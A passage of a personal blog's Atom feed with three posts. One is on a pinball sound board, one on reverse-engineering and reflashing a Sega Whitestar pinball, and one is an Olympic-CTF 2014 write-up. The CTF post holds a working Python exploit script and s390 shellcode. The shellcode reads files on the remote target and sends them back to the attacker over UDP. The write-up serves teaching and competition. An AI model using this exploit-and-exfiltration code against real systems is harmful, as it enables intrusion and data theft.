+kind of simple signal mixing.
+
+On the other hand, the sound CPU firmware seems to perfectly use those hardware
+ressources in order to get a flexible and fine-grained audio sequencer which is
+crucial for this kind of arcade machine. This can be heard in particular during
+the start of multiball sequence in which 10 patterns are played simultaneously.
+
+In conclusion, this sound system is an outstanding sample of the state of
+art audio and electronics engineers from the 80s. However, this pinball was
+released in 1997. The same result could have been achieved by using more
+reliable and cheaper componants. Of course, we can consider this outdated
+design as an essential part of pinball culture's folklore.
+
+-- 
+Pierre Surply
+</content>
+    <link href="http://blog.psurply.com/0003-sega_whitestar_pinball_sound_board.txt" rel="alternate"/>
+    <published>2015-11-20T00:00:00+01:00</published>
+  </entry>
+  <entry>
+    <id>urn:uuid:ddf8f90c-16b7-5d95-b763-5b057e5f6b3c</id>
+    <title>Hacking a Sega Whitestar Pinball</title>
+    <updated>2014-12-16T00:00:00+01:00</updated>
+    <author>
+      <name>Pierre Surply</name>
+      <email>surply@lse.epita.fr</email>
+    </author>
+    <content type="text">## Sega Starship Troopers Pinball Overview
+
+The `Sega Starship Troopers Pinball` is fairly representative of the
+*WhiteStar Board System* used in several *Sega* pinball games and
+*Stern Pinball*. This hardware architecture was firstly designed in 1995 for
+the *Apollo 13* game with the objective to be convenient and extensible in
+order to be reusable for other playfields. This way, Sega could exploit a
+large number of licenses without having to design new control circuits for each
+machine.
+
+This architecture is based on three Motorola `68B09E` clocked at 2MHz and used
+as main CPU, display controller and sound controller. The two last are mainly
+dedicated to monitor application-specific processors: for instance, the `6809`
+used on the display board is charged to interface a `68B45` CRT controller to
+the main CPU. The sound processing is handled by a `BSMT2000`, a custom
+masked-rom version of the `TI TMS320C15` DSP.
+
+Sega used this system for 16 other games including *GoldenEye*, *Star Wars*
+and *Starship Troopers*.
+
+![](/medias/images/playfield_top.jpg)
+
+### Playfield's wiring
+
+The playfield wiring is quite simple: all switches are disposed in a matrix
+grid. This method provides a simple way to handle a high number of I/O with a
+reasonable number of connectors. So, in order to read the switches state, the
+CPU has to scan each raw of the matrix by grounding it and watching in which
+column the current is flowing.
+
+A similar circuit is used to control playfield lamps: each raw has to be
+scanned by grounding it and applying voltage on the column connector
+according to lamps that have to be switched on the selected raw.
+
+![Lamp wiring](/medias/images/lamp_wiring.png)
+
+It's truly easy to control a high number of lamps with this layout.
+The following code switches on the lamp 31 (multiball).
+
+    :::nasm
+    lda   #$8
+    sta   LAMP_ROW  ;; Ground selected row
+    clra
+    sta   LAMP_AUX  ;; Clear auxiliary rows
+    lda   #$40
+    sta   LAMP_COL  ;; Drive selected column
+
+Although playfield switches are handled by the matrix grid, some frequently
+used buttons are connected to a dedicated connector. This allows the CPU to
+directly address this input without having to scan the entire input matrix.
+These switches are user buttons and End-Of-Stroke.
+
+![Flippers Wiring](/medias/images/flipper_wiring.png)
+
+The E.O.S switch prevents foldback when the player has the flipper energized to
+capture balls. When the Game CPU detects that this switch is open, it
+stabilizes the position of the selected flip by reducing the pulse applied to
+the coil.
+
+### The Backbox
+
+The Backbox contains all the electronic circuits controlling playfield's
+behaviour. We will focus on this very part throughout the article.
+
+#### CPU/Sound Board
+
+The main board contains the Game CPU and the Sound circuit. The switches are
+directly connected to this board so that it is really simple for the CPU to
+fetch their values.
+
+![CPU Board](/medias/images/cpu_board.jpg)
+
+One of the main problems of this board is the battery location. Populated with
+a 3xAA battery holder to keep the RAM content alive, alkaline batteries are
+located on top of the CPU, ROM and RAM chip, which is critical when they will
+start to leak on this components. Before I started playing with this machine, I
+spend hours restoring and cleaning the PCB because of the corrosive leaking.
+To avoid deterioration, relocating this battery could be a smart idea.
+
+#### Display Controller Board
+
+Like many pinball machines from the 90s, the backbox is equipped with an old
+school dot matrix display.
+
+As the CPU Board, it is based on a Motorola `68B09E` with a dedicated 512MB
+UVPROM which contains the dot matrix display driver code and images that can be
+displayed on it. It communicates with the main board via a specific protocol.
+
+To interface the raster display, the board uses a Motorola `68B45` (`68B45 CRTC`
+for "cathode ray tube controller"). Although this chip was primarily
+designed to control the CRT display, it can also be used to generate correctly
+timed signal for a raster dot matrix display like in this case.
+
+#### I/O Power Driver Board
+
+The IO Power Driver Board is an interface between the low current logic circuit
+and the high current playfield circuit.
+
+The first part of this circuit consists of converting the alternative current
+provided by the transformer into exploitable direct current thanks to 5 bridges
+rectifiers.
+
+The only electromagnetic relay is dedicated to the general illumination and is
+not controllable via the main CPU. The rest is driven by MOSFET power
+transistors which are designed to be able to handle high current in order to
+power playfield coils. Moreover, fuses are placed before each bridges
+rectifiers in order to easily help identifying where the problem comes from in
+case of failure.
+
+![IO Board](/medias/images/io_board.jpg)
+
+![IO Board Power supply](/medias/images/power.png)
+
+## Upgrading the firmware
+
+![ROM Summary](/medias/images/rom_summary.png)
+
+The title screen displayed in the dot matrix plasma display indicates that
+the firmware's version is `2.00`. However, an up-to-date image of this ROM
+exists in [Internet Pinball Database](http://www.ipdb.org/machine.cgi?id=4341)
+which seems to be on version `2.01` according to the ascii string located at
+offset `$66D7`. Let's try to upgrade the pinball!
+
+An almost suitable flash memory to replace the original UVPROM is the
+`A29040C`. The only mismatches on the pinout are the `A18` and `WE` pins. This
+is a minor problem since I fixed the PCB to match the `A29040C` layout.
+
+![Pinout Mismatch](/medias/images/pinout_mismatch.png)
+
+Burning the `A29040C` with the new firmware requires a flash memory programmer.
+I decided to craft one with an `Arduino mega 1280` based on an `AVR Atmega 1280`
+microcontroller. The large number of IO of this chip is essential to complete
+the programming protocol of the `A29040C`.
+
+![Homemade Flash Programmer](/medias/images/flash_programmer.jpg)
+
+After successfully programming the flash memory, I was pretty disappointed when
+I noticed that the new ROM chip was still not working.
+
+I thought that this UVPROM was able to store 512KB of data, just like
+`A29040C`. It took me a while to realise that the game is a 128KB ROM although
+the chip is designed to be connected to a 19 bit address bus. This means that
+the game's ROM simply ignores the value of `A17` and `A18` signals, which means
+that the game code is mirrored 4 times in the whole ROM address space.
+
+![Mirroring](/medias/images/mirroring.png)
+
+## Building a custom ROM
+
+Now that we are able to substitute the original ROM with a custom flash memory,
+let's try to run our own code on this machine.
+
+The first thing that we have to do in this case is to determine where the CPU
+will fetch its first instruction after a reset.
+According to the`6809` datasheet, the interrupt vector table (which contents
+the address of the `reset` event handler) is located at `0xFFFE`. However, this
+offset refers to the CPU address space, not that of the ROM chip. So, after a
+reset, which part of this memory is mapped at `0xFFFE`?
+
+To answer this, it's essential to follow the address bus of the UVPROM. We then
+easily see that bits 14 to 18 of this bus are connected to 5-bit register
+(`U211`) while bits 13 to 0 are directly bound to CPU address bus.
+
+This is a typical configuration to implement a bank system since the CPU
+address space is too narrow to map the entire ROM. That's why only one part of
+it (also called a *bank*) is mapped at a given time.
+The mapped bank is chosen by the `U211` register, called `XA`, and can be
+easily wrote by the CPU when a bank switching is needed.
+
+![Bank System](/medias/images/bank.png)
+
+### Finding address space
+
+On this kind of device, it's always painful to debug the code running directly
+on the board. The only way to achieve it here is to trigger some visual element
+of the playfield in order to get a basic tracing of the execution flow.
+
+As there is no IO port on the `6809`, all devices are memory-mapped. The
+question now is: where are they located?
+
+First, let's focus on the address decoding circuit of the IO Board.
+
+![IO Addressing](/medias/images/IO_addr.png)
+
+In order to simplify cascading, the `74138` multiplexer generates output only
+if the Boolean expression `G1 &amp;&amp; !G2A &amp;&amp; !G2B` is true. So, in this circuit,
+`U204` covers IO addresses from `0x0` to `0x7` and `U205` handles from `0x8` to
+`0xF`.
+
+As we can see on this schematic, the question is: where does the `IOSTB` signal
+come from?
+
+Following the wire, we can see that this control signal is generated by the CPU
+Board. It actually acts as a *chip select*: it means that this signal is used
+to indicates to the IO Board that we are addressing it.
+
+To be more precise, the `IOSTB` is driven by the `U213` chip, a `PAL16L8`
+(Programmable Array Logic). This kind of integrated circuit is used to
+implement combinatoric logic expressions. This is widely used for address
+decoding.
+
+![PAL16L8 Pinout](/medias/images/PAL16L8.png)
+
+Dumping the logical expression programmed on this chip is essential to
+determine the actual CPU address space. One way to do it is to basically
+test all possible inputs and watch how outputs evolves according to input
+values. However, some of the `PAL16L8` pins can be considered as inputs as well
+as outputs. In this case, we can guess that `XA0`, `A9` and `A10` are used as
+input pins according to the rest of the circuit.
+
+I desoldered the PAL, in order to prevent undesired side effect on the rest of
+the circuit, and used a simple *Arduino Uno* to generate the truth tables of
+all outputs.
+
+![Dumping the PAL16L8](/medias/images/pal_dump.jpg)
+
+Now, let's extract irreducible logical expressions from the recorded truth
+tables. As a matter of fact, these truth tables are significantly too large to
+apply the well-known Karnaugh map method to simplify the extended logical
+expression. This problem can be solved by using the
+[electruth python module](https://pypi.python.org/pypi/electruth). It fully
+implements the Quine-McCluskey method which is perfectly suitable in this
+situation.
+
+After a few hours of computation, I got these expressions, which are truly
+helpful in the address space determination process:
+
+    :::text
+    ~ROMCS = A15 || A14
+    ~RAMCS = !A15 &amp;&amp; !A14 &amp;&amp; !A13 &amp;&amp; (!A12 || !A11 || !A10 || !A9 || RW || MPIN)
+    IOPORT = !(!A15 &amp;&amp; !A14 &amp;&amp; A13 &amp;&amp; !A12 &amp;&amp; !A11 &amp;&amp; !XA0)
+    IOSTB = !A15 &amp;&amp; !A14 &amp;&amp; A13 &amp;&amp; !A11
+
+Notice the `MPIN` input which is a signal generated by the cabinet door when
+it's open. So, the `PAL` restricts the access to a small part of the RAM when
+the coin door is closed. This section is actually used to store game settings
+that are only editable for maintenance purpose.
+
+Here is the address space that I was finally able to discover according to the
+actual wiring:
+
+- `0000`-`1FFF` : RAM
+    - `0000`-`1DFF` : Read/Write Area
+    - `1E00`-`1FFF` : Write Protected Area
+- `2000`-`27FF` : IO (IOBOARD)
+    - `2000` : HIGH CURRENT SOLENOIDS A
+        - bit 0 : Left Turbo Bumper
+        - bit 1 : Bottom Turbo Bumper
+        - bit 2 : Right Turbo Bumper
+        - bit 3 : Left Slingshot
+        - bit 4 : Right Singshot
+        - bit 5 : Mini Flipper
+        - bit 6 : Left Flipper
+        - bit 7 : Right Flipper
+    - `2001` : HIGH CURRENT SOLENOIDS B
+        - bit 0 : Trough Up-Kicker
+        - bit 1 : Auto Launch
+        - bit 2 : Vertical Up-Kicker
+        - bit 3 : Super Vertical Up-Kicker
+        - bit 4 : Left Magnet
+        - bit 5 : Right Magnet
+        - bit 6 : Brain Bug
+        - bit 7 : European Token Dispenser (*not used*)
+    - `2002` : LOW CURRENT SOLENOIDS
+        - bit 0 : Stepper Motor #1
+        - bit 1 : Stepper Motor #2
+        - bit 2 : Stepper Motor #3
+        - bit 3 : Stepper Motor #4
+        - bit 4 : *not used*
+        - bit 5 : *not used*
+        - bit 6 : Flash Brain Bug
+        - bit 7 : Option Coin Meter
+    - `2003` : FLASH LAMPS DRIVERS
+        - bit 0 : Flash Red
+        - bit 1 : Flash Yellow
+        - bit 2 : Flash Green
+        - bit 3 : Flash Blue
+        - bit 4 : Flash Multiball
+        - bit 5 : Flash Lt. Ramp
+        - bit 6 : Flash Rt. Ramp
+        - bit 7 : Flash Pops
+    - `2004` : *N/A*
+    - `2005` : *N/A*
+    - `2006` : AUX. OUT PORT (*not used*)
+    - `2007` : AUX. IN PORT (*not used*)
+    - `2008` : LAMP RETURNS
+    - `2009` : AUX. LAMPS
+    - `200A` : LAMP DRIVERS
+- `3000`-`37FF` : IO (CPU/SOUND BOARD)
+    - `3000` : DEDICATED SWITCH IN
+        - bit 0 : Left Flipper Button
+        - bit 1 : Left Flipper End-of-Stroke
+        - bit 2 : Right Flipper Button
+        - bit 3 : Right Flipper End-of-Stroke
+        - bit 4 : Mini Flipper Button
+        - bit 5 : Red Button
+        - bit 6 : Green Button
+        - bit 7 : Black Button
+    - `3100` : DIP SWITCH
+    - `3200` : BANK SELECT
+    - `3300` : SWITCH MATRIX COLUMNS
+    - `3400` : SWITCH MATRIX ROWS
+    - `3500` : PLASMA IN
+    - `3600` : PLASMA OUT
+    - `3700` : PLASMA STATUS
+- `4000`-`7FFF` : ROM
+- `8000`-`BFFF` : ROM (Mirror)
+- `C000`-`FFFF` : ROM (Mirror)
+
+### Handling reset circuitry
+
+In this kind of real-time application, where a huge number of unpredictable
+events have to be handled, the risk of race condition cannot be fully faded.
+
+Although the software is designed to be able to face any situations, the
+hardware has to be prepared to a faulty program. One of the simplest and
+more robust method is to use a *watchdog timer*. This consists of an autonomous
+timer charged to trigger a reset signal to the system if it reaches its
+initial point. The main idea here is to force the circuitry to be stopped if it
+does not correctly respond in order to prevent any damage from uncontrolled
+behaviour.
+
+In most cases, the timer has to be fed by the software running on the CPU. So,
+if we want to run our own code on that machine, it's essential to
+implement as a subroutine the reset of the watchdog in order to stay alive.
+
+In the *Whitestar* pinball, two distinct watchdogs have to be correctly handled.
+The first one is located on the CPU/Sound Board and is directly connected to
+the reset pin of the `6809`. *SEGA* engineers chose to use a `DS1232` chip
+(`U210`) which integrates all the features that are commonly used to monitor a
+CPU. So, in addition to a regular watchdog timer, this chip also provides a
+power monitoring and an external override which is actually designed to allow
+the use of a push button to force the CPU reset (`SW200`).
+
+As the `TOL` pin of this chip  is grounded, the `DS1232` continually watches
+the voltage applied on `Vcc` pin and triggers a reset signal if its value
+is under 4.7V. From a software engineer point of view, the important pin in
+that case is the *strobe input* (`ST`): it is used to reset the watchdog timer
+when a falling edge is applied to it.
+
+On the CPU/Sound Board, this pin is connected to either clock signal (generated
+by `U2`) or `BSEL` signal according to the location of the jumper (`Wx` or `Wy`).
+As `Wx` was jumpered on my board, we can assume that the configuration in which
+`Wy` is fit was used during firmware development. So programmers were able to
+test their code without having to mind about the watchdog reset: this was
+automatically done by the clock signal. When the pinball was about to be
+released, calls to the watchdog reset subroutine were injected in appropriate
+parts of the firmware and the jumper was moved from `Wy` to `Wx`.
+
+In my opinion, modifying the hardware by desoldering the jumper and resoldering
+it on `Wy` is a little bit too easy to solve this kind of problem. So, let's
+try to handle the watchdog timer with a suitable software subroutine.
+
+The `BSEL` signal is generated when writing at address `0x3200` and is actually
+used as clock signal for the bank selection (`U211`). This is a clever way to
+get a nonintrusive watchdog reset subroutine: it's, in fact, hooked on the bank
+switching mechanism. The hardware designers probably thought it was a good idea
+to check the regularity of the code execution only by testing a periodic bank
+switching...
+
+In our case, we do not need to switch from initial bank. The trick I used here
+is to write `0` in the `XA` register, so the bank is unchanged but the watchdog
+is fed anyway.
+
+![CPU Board watchdog](/medias/images/watchdog_cpu.png)
+
+The second watchdog is located on the IO Board. The chip used is still a
+`DS1232` (`U210`) but the wiring is a little bit different. Firstly, since
+there is no code running on that board, the reset pin of the `U210` is not
+connected to a CPU but to all registers (8-bit D flip-flop) which drive power
+transistors.
+
+Secondly, there is no reset pushbutton on the IO Board. The `PBRESET` pin is
+connected to the `BRESET` signal coming directly from the CPU/Sound board.
+So, if the first `DS1231` triggers a reset signal, it automatically overrides
+the second watchdog timer and forward the signal to all IO Board components.
+However, this is not reciprocal: the IO Board cannot stops the CPU/Sound Board.
+
+The *strobe input* of this watchdog is directly connected to the `DAV0` signal
+which is used to ground the first raw of the lamp matrix. This means that the
+firmware has to frequently scan it to keep the IO Board alive. Tricky, but
+not fully irrelevant since the lights are still blinking on this kind of
+arcade machine in order to keep the game catchy.
+
+All of this reset circuitry have to be kept in mind when developing a firmware
+for this kind of platform.
+
+![IO Board watchdog](/medias/images/watchdog.png)
+
+
+### Final code
+
+After many hours spent to reverse engineer the hardware part of this machine, I
+was finally able to print *LSE* on the 7-segment display of the playfield
+thanks to the code fetched from a custom flash ROM.
+
+Here is the assembly code of my own basic firmware:
+
+    :::nasm
+    LAMP_ROW EQU $2008
+    LAMP_AUX EQU $2009
+    LAMP_COL EQU $200A
+    BANK_SELECT EQU $3200
+
+    ;; CPU/Board Watchdog reset
+    wdr            .MACRO
+                    clra
+                    sta BANK_SELECT
+                    .ENDM
+
+    ;; Dummy delay subroutine
+    delay           .MACRO i
+                    lda i
+    @l:             deca
+                    bne @l
+                    .ENDM
+
+    ;; Entry point
+                    .ORG    0xC000
+    main:           ldx #lamps
+                    clrb
+                    stb LAMP_AUX    ;; Clear auxiliary rows
+                    incb            ;; Select first row
+
+    loop:           clra
+                    sta LAMP_ROW
+                    sta LAMP_COL    ;; Clear rows and colunms
+                    delay #$1F      ;; Dummy delay
+
+                    lda ,x+         ;; Fetch columns value
+                    sta LAMP_COL    ;; Set columns
+                    stb LAMP_ROW    ;; Ground selected row
+
+                    delay #$1F      ;; Dummy delay
+                    wdr             ;; Watchdog reset
+
+                    lslb            ;; Select next row
+
+                    bne loop        ;; Branch if the first 8 rows are not updated
+                    bcc main        ;; Branch if the 9th row is updated
+
+                    rolb
+                    stb LAMP_AUX    ;; Select the 9th row
+                    clrb
+                    bra loop
+
+    ;; Lamp matrix values
+    lamps:
+                    DB $01, $00, $00, $00, $00
+                    DB $00, $1C, $B6, $9F, $00
+
+    ;; Interrupt vector table
+                    .ORG    0xFFFE
+    reset:          DW main
+
+`tpasm` is needed to assemble the preceding code and turn it into an Intel hex
+file using the following commands:
+
+    :::sh
+    $ tpasm -P 6809 -o intel cpu.hex cpu.s
+    $ hex2bin ./cpu.hex
+    $ dd if=/dev/zero of=cpu.rom bs=16K count=32
+    $ dd if=cpu.bin of=cpu.rom bs=16K seek=31
+
+![LSE Pinball](/medias/images/lse_pinball.jpg)
+
+## Conclusion
+
+Hacking this kind of machine has been as rewarding for me as it is for some
+people to play flipper.
+
+Unfortunatly, *Sega Pinball* left the market in 1999 (2 years after releasing
+the Starship Troppers pinball...) and sold all pinball assets to
+*Stern Pinball, Inc*. This company used the *WhiteStar* architecture until 2005
+with *NASCAR* arcade machine. When *The Lord of the Rings* was released in 2003,
+they edited some part of the sound system by replacing the
+`Motorola 6809` / `BSMT2000` duo by a 32-bit `Atmel AT91SAM` ARM-based CPU and
+three `Xilinx FPGAs`. So the `6809-BSMT2000` system is fully emulated by this
+circuit to provide backward-compatibility.
+
+Now that we have hacked the hardware, what about reverse engineering the
+original firmware? Maybe another time...
+
+I hope you enjoyed this guided tour!
+
+![](/medias/images/concl.png)
+
+## References
+
+- [SST Manual](http://mirror2.ipdb.org/files/4341/Sega_1997_Starship_Troopers_Manual.pdf)
+- [74138 Datasheet](http://www.ti.com/lit/ds/symlink/sn74ls138.pdf)
+- [DS1232 Datasheet](http://datasheets.maximintegrated.com/en/ds/DS1232.pdf)
+- [68B09 Datasheet](http://www.gbgmv.se/dl/doc/md09/MC6809_DataSheet.pdf)
+- [68B45 Datasheet](http://www.classiccmp.org/dunfield/r/6845.pdf)
+- [PAL16L8 Datasheet](http://www.ti.com/lit/gpn/pal16r6am)
+- [A29040C Datasheet](http://www.farnell.com/datasheets/1770385.pdf)
+
+-- 
+Pierre Surply
+</content>
+    <link href="http://blog.psurply.com/0002-hacking_a_sega_whitestar_pinball.txt" rel="alternate"/>
+    <published>2014-12-16T00:00:00+01:00</published>
+  </entry>
+  <entry>
+    <id>urn:uuid:46a0b35f-c07d-5eb2-9311-51aaf2543df9</id>
+    <title>Olympic-CTF 2014: zpwn (200 points)</title>
+    <updated>2014-02-10T00:00:00+01:00</updated>
+    <author>
+      <name>Pierre Surply</name>
+      <email>surply@lse.epita.fr</email>
+    </author>
+    <content type="text">This challenge was based on an IBM s/390 ELF running on a remote server
+which listens on UDP port 31337.
+
+The first thing we did was to setup *Hercules*, an open source software
+implementation of the mainframe System/370 and ESA/390 architectures, to
+run a linux distribution. After some tries with Debian and openSUSE, we finally
+succeeded to set up Fedora 20 on this emulator.
+
+## Reversing ELF
+
+At first sight, the binary seems to send the entire buffer sent by the client
+via UDP.
+
+After disassembling it, we saw that the buffer is hashed and compared to a
+constant value: if the hash is equal to `0xfffcecc8` then the process jumps into
+the received buffer instead of sending it back.
+
+    :::asm
+    /* Receive buffer via UDP */
+    80000b26:   a7 49 20 00             lghi    %r4,8192 ; len
+    80000b2a:   b9 04 00 2a             lgr     %r2,%r10 ; sockfd
+    80000b2e:   b9 04 00 3b             lgr     %r3,%r11 ; buff
+    80000b32:   a7 59 00 00             lghi    %r5,0    ; flags
+    80000b36:   b9 04 00 69             lgr     %r6,%r9  ; src_addr
+    80000b3a:   a7 18 00 10             lhi     %r1,16
+    80000b3e:   50 10 f0 cc             st      %r1,204(%r15)
+    80000b42:   c0 e5 ff ff fe 51       brasl   %r14,800007e4 &lt;recvfrom@plt&gt;
+    80000b48:   b9 14 00 42             lgfr    %r4,%r2
+    80000b4c:   b9 02 00 44             ltgr    %r4,%r4
+    80000b50:   a7 84 00 1d             je      80000b8a
+    80000b54:   b9 04 00 5b             lgr     %r5,%r11
+    80000b58:   a7 28 ff ff             lhi     %r2,-1
+    80000b5c:   b9 04 00 34             lgr     %r3,%r4
+
+    /* Hash buffer */
+    80000b60:   43 10 50 00             ic      %r1,0(%r5)
+    80000b64:   41 50 50 01             la      %r5,1(%r5)
+    80000b68:   17 12                   xr      %r1,%r2
+    80000b6a:   88 20 00 08             srl     %r2,8
+    80000b6e:   b9 84 00 11             llgcr   %r1,%r1
+    80000b72:   eb 11 00 02 00 0d       sllg    %r1,%r1,2
+    80000b78:   57 21 c0 00             x       %r2,0(%r1,%r12)
+    80000b7c:   a7 37 ff f2             brctg   %r3,80000b60
+    80000b80:   c2 2d ff fc ec c8       cfi     %r2,-201528 ; Compare hash to 0xfffcecc8
+    80000b86:   a7 84 00 14             je      80000bae
+
+    /* Send buffer via UDP if hash(buffer) != 0x31eedfb4 */
+    80000b8a:   b9 04 00 2a             lgr     %r2,%r10 ; sockfd
+    80000b8e:   b9 04 00 3b             lgr     %r3,%r11 ; buff
+    80000b92:   a7 59 00 00             lghi    %r5,0    ; flags
+    80000b96:   b9 04 00 69             lgr     %r6,%r9  ; dest_addr
+    80000b9a:   a7 19 00 10             lghi    %r1,16
+    80000b9e:   e3 10 f0 a0 00 24       stg     %r1,160(%r15)
+    80000ba4:   c0 e5 ff ff fe 70       brasl   %r14,80000884 &lt;sendto@plt&gt;
+    80000baa:   a7 f4 ff bb             j       80000b20
+
+    /* Jump into buffer if hash(buffer) == 0xfffcecc8 */
+    80000bae:   0d eb                   basr    %r14,%r11
+    80000bb0:   a7 f4 ff b8             j       80000b20
+
+## Breaking the hash
+
+When we look closer to the hash function, we can see that `%r2` register is
+initialized to `0xffffffff` and then xored with some values located in
+`.rodata`. Because `%r2` is right shifted before each `xor` operation, it is
+easy to find the location of this data by applying a reversed version of this
+algorithm and analysing the most significant byte of each `%r2` value.
+
+    :::text
+    800010e0:   ff 0f 6a 70
+              ^ ff fc ec c8
+              --------------
+                00 f3 86 b8 ----\
+                                |
+                                | srl 8
+    80000dc4:   f3 b9 71 48     |
+              ^ f3 86 b8 xx   &lt;-/
+              --------------
+                00 3f c9 xx ----\
+                                |
+                                | srl 8
+    80001014:   3f b5 06 dd     |
+              ^ 3f c9 xx xx   &lt;-/
+              --------------
+                00 7c xx xx
+
+    800010b4:   7c dc ef b7
+
+Then, we deduced that these values are located at `800010b4`, `80001014`,
+`80000dc4` and `800010b4`. We could now apply the right algorithm to get
+the real values of `%r2`.
+
+    :::text
+    (0xffffffff &gt;&gt; 8) ^ 0x7cdcefb7 = 0x7c231048
+    (0x7c231048 &gt;&gt; 8) ^ 0x3fb506dd = 0x3fc925cd
+    (0x3fc925cd &gt;&gt; 8) ^ 0xf3b97148 = 0xf386b86d
+    (0xf386b86d &gt;&gt; 8) ^ 0xff0f6a70 = 0xfffcecc8
+
+The less significant byte of this values must now be xored with each offset
+to obtain the key.
+
+    :::text
+    Offsets:
+       (0x800010e0 - 0x80000d7c) &gt;&gt; 2 = 0xd9
+       (0x80000dc4 - 0x80000d7c) &gt;&gt; 2 = 0x12
+       (0x80001014 - 0x80000d7c) &gt;&gt; 2 = 0xa6
+       (0x800010b4 - 0x80000d7c) &gt;&gt; 2 = 0xce
+
+    Key: 0xcea612d9 ^ 0xff48cd6d = 0x31eedfb4
+
+So, when this process receives `0x31eedfb4` via UDP, it jumps to the buffer
+address.
+
+To prevent SIGSEGV or SIGILL when the process executes the first
+instruction of shellcode, we first need to complete the opcode `0xdfb4` to
+get a valid instruction:
+
+    :::asm
+    31 ee               lner %f14,%f14
+    df b4 0f 00 00 00   edmk 0(181,%r15),0
+
+## Exploit
+
+Here is the python script that we used to generate shellcodes using
+`s390-linux-as` and `s390-linux-objcopy` and send it to the remote
+machine:
+
+    :::python
+    import socket
+    import subprocess
+
+    SERVER_IP = "109.233.61.11"
+    CLIENT_IP = # local ip
+
+    UDP_PORT = 31337
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.sendto("Hi !", (SERVER_IP, UDP_PORT))
+    print sock.recvfrom(1024)[0]
+    port = sock.getsockname()[1]
+
+    asm = open("exploit200.s").read()
+    asm = asm.replace("____", hex(port)[2:])
+    asm = asm.replace("-------", CLIENT_IP)
+
+    p = subprocess.Popen("s390-linux-as -o exploit200",
+                          stdin=subprocess.PIPE, shell=True)
+
+    p.communicate(asm)
+
+    p = subprocess.Popen("s390-linux-objcopy -O binary exploit200 /dev/stdout",
+                       stdout=subprocess.PIPE, shell=True)
+
+    sock.sendto(p.communicate()[0], (SERVER_IP, UDP_PORT))
+    print sock.recvfrom(1024)[0]
+    sock.sendto("\x31\xee\xdf\xb4", (SERVER_IP, UDP_PORT))
+    print sock.recvfrom(1024)[0]
+
+### Listing the current directory
+
+The first step of this exploit is to list the current directory to find
+the file which contains the flag. This can be done by filling a buffer with
+`getdents` syscall and then send it via UDP to the local machine.
+
+    :::asm
+        .long 0x00000000
+        .long 0xf0000000
+    exploit:
+         /* open */
+        lhi     %r1, 5
+        larl    %r2, dir
+        lhi     %r3, 0
+        lhi     %r4, 0
+        svc     0
+
+        /*getdents*/
+        lhi     %r1, 141
+        lgr     %r3,%r11
+        afi     %r3, 4096
+        lghi    %r4, 4096
+        svc     0
+
+        /* sendto */
+        lgr     %r4,%r2
+        lgr     %r2,%r10
+        lgr     %r3,%r11
+        afi     %r3, 4096
+        lghi    %r5,0
+        larl    %r6, addr
+        afi     %r12, -1272
+        lghi    %r1,16
+        stg     %r1,160(%r15)
+        balr    %r14, %r12
+    addr:   .quad 0x02____-------
+    dir:    .string "."
+
+Response:
+
+    :::text
+    \x00\x00\x00\x00\x00\x00\x00\x11\x0fe\x95\xe2\xb6&gt;!I\x00 nohup.out\x00\x00
+    \x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x12\x1c\t^\r\x82\x91T\xe0\x00\x18
+    zpwn\x00\x08\x00\x00\x00\x00\x00\x00\x00\x0c2z)5\x13T\xc6\x17\x00\x18.\x00
+    \x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x13?F\xf4bC\\\xcf\xda\x00(
+    .bash_history\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00
+    \x00\rB\xf6H\x1f\x00 \xb1\xb4\x00 .bash_logout\x00\x08\x00\x00\x00\x00\x00
+    \x00\x00\x0fN_\x88r\x1b\xbc\x90L\x00 .bashrc\x00\x00\x00\x00\x00\x00\x08
+    \x00\x00\x00\x00\x00\x00\x00\x02OpO/F\x88\x8f\x00\x00\x18..\x00\x00\x00
+    \x04\x00\x00\x00\x00\x00\x00\x00\x0eY{P\xb5\xc3\xe0\x02\xf0\x00 .profile
+    \x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x16m\x9cn\xc56.\x9a\x91
+    \x00 watchdog.sh\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x10\x7f\xff\xff\xff
+    \xff\xff\xff\xff\x00 flag.txt\x00\x00\x00\x00\x00\x08
+
+Thanks to `getdents`'s buffer, we can then see that a file `flag.txt` exists in
+the current directory.
+
+### Reading flag.txt
+
+Let's try to open `flag.txt` and read its contents:
+
+    :::asm
+        .long 0x00000000
+        .long 0xf0000000
+    exploit:
+        /* open */
+        lhi     %r1, 5
+        larl    %r2, flag
+        lhi     %r3, 0
+        lhi     %r4, 0
+        svc     0
+
+        /*read*/
+        lhi     %r1, 3
+        lgr     %r3,%r11
+        afi     %r3, 4096
+        lhi     %r4, 4096
+        svc     0
+
+        /* sendto */
+        lgr     %r4,%r2
+        lgr     %r2,%r10
+        lgr     %r3,%r11
+        afi     %r3, 4096
+        lghi    %r5,0
+        larl    %r6, addr
+        afi     %r12, -1272
+        lghi    %r1,16
+        stg     %r1,160(%r15)
+        balr    %r14, %r12
+
+    addr:   .quad 0x02____-------
+    flag:   .string "./flag.txt"
+
+And it worked, giving us the flag: `CTF{684eed23a11fd416bb56b809d491eef4}`
+
+-- 
+Pierre Surply
+</content>
+    <link href="http://blog.psurply.com/0001-olympic_ctf_2014_zpwn.txt" rel="alternate"/>
+    <published>2014-02-10T00:00:00+01:00</published>
+  </entry>
+</feed>
